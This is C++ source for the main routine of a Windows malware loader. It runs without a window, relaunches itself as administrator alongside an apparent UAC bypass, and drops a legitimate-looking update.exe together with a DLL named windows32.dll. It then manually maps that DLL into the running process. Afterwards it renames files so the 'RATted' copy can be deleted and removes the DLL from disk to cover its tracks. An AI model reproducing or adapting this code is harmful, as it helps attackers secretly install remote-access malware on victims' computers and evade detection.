#include "injection.h"
#include "utils.h"
#include "embeds.h"

extern "C" {
    #include "bypass.h"
}

#include <Shared/folders.h>
#include <Shared/utility.h>

#include <string>
#include <iostream>
#include <WinUser.h>

#define     MY_DLL      "windows32.dll"
#define     MY_TARGET   "update.exe"

//WinMain is the entry point for windows subsystem (GUI apps) but without initializing the window the process will be hidden graphically
int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    //Alloc console for debugging purposes since the manual mapper can't be compiled in debug
    CreateDebugConsole();
	//Must be called before calling UAC bypass due to it manipulating/faking executable information
	auto cwd = GetCWD();
    auto target = (cwd + std::string(MY_TARGET)); //Full path to the target executable

    if (!Utils::IsElevated()) {
        StartProcessAsAdmin((LPWSTR)ExePathW(), FALSE);
        return 0;
    }

    Utils::ExtractImageToDisk(embedded_image_2, embedded_image_2_size, cwd + MY_DLL);
#ifndef SELF_INJECTION
    //Extracts the legit image and dll to execute from its own image and starts it (inherits administrator permission from parent process)
    Utils::ExtractImageToDisk(embedded_image_1, embedded_image_1_size, target); //First embedded image should be the legit executable
    STARTUPINFO info = { sizeof(info) };
    PROCESS_INFORMATION processInfo;
    while (!CreateProcessA(target.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
    {
        Sleep(100);
    }
    CloseHandle(processInfo.hThread);

	HANDLE hProc = processInfo.hProcess;
#else
    HANDLE hProc = GetCurrentProcess();
#endif

	auto pMyDll = ManualMap(hProc, (cwd + MY_DLL).c_str());
	while (!pMyDll) {
        pMyDll = ManualMap(hProc, (cwd + MY_DLL).c_str());
        Sleep(1000);
	}
	CloseHandle(hProc);

#ifndef SELF_INJECTION
    auto full_path = ExePathA();
    while (rename(full_path , (GetCWD() + "trash.tmp").c_str()) != 0) {
        Sleep(100);
    }

    //Rename update.exe to this file's original name to let Dll know it can delete the RATted version from disk
    while (rename(target.c_str(), full_path)) { 
        Sleep(100);
    }
#endif

    //Remove my dll from disk just in case idk
    remove((cwd + MY_DLL).c_str());

#ifdef SELF_INJECTION
    //Sleep to let DLL do its stuff
    while (true) Sleep(1); 
#endif
	return 0;
}
